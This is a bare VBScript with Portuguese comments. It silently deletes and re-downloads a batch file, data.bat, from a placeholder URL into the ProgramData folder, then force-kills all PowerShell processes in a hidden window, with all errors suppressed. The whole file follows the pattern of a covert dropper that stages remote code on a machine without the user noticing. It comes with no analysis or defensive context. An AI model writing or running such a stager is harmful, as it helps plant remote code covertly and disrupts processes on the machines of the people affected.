On Error Resume Next

Dim objShell, objFSO, strProgramData, strBatFile, strURL

' Cria objetos
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define caminhos
strProgramData = objShell.ExpandEnvironmentStrings("%ProgramData%")
strBatFile = strProgramData & "\data.bat"
strURL = "https://example.com/data.bat"

' Deleta data.bat se existir (silencioso)
If objFSO.FileExists(strBatFile) Then
    objFSO.DeleteFile strBatFile, True
End If

' Baixa data.bat da URL (silencioso)
Dim objHTTP
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objHTTP.Open "GET", strURL, False
objHTTP.Send

If objHTTP.Status = 200 Then
    ' Salva o arquivo baixado (silencioso)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 'adTypeBinary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strBatFile, 2 'adSaveCreateOverWrite
    objStream.Close
    Set objStream = Nothing
End If

' Mata todos os processos powershell.exe (hidden)
objShell.Run "taskkill /F /IM powershell.exe", 0, False

' Limpa objetos
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
